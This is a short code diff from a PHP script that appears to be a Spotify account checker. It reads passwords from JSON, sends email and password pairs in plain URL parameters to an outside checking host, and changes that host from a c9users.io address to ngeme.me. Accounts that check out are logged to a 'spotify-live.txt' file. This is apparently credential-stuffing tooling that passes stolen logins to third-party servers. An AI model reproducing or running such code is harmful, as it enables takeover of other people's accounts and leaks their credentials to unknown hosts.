@@ -24,7 +24,7 @@ for($a=0;$a<count($data);$a++){
 		$json = json_decode($get,true);
 		$pass = $json['password'];
 	}
-	$cek = @file_get_contents("https://nanikore-lalalalisa.c9users.io/spotify.php?email=$email&pass=$pass");
+	$cek = @file_get_contents("http://ngeme.me/spotify.php?email=$email&pass=$pass");
 	if (strpos($cek,"Spotify")) {
  if(!in_array($cek,explode("\n",@file_get_contents("spotify-live.txt")))){
   $h=fopen("spotify-live.txt","a");
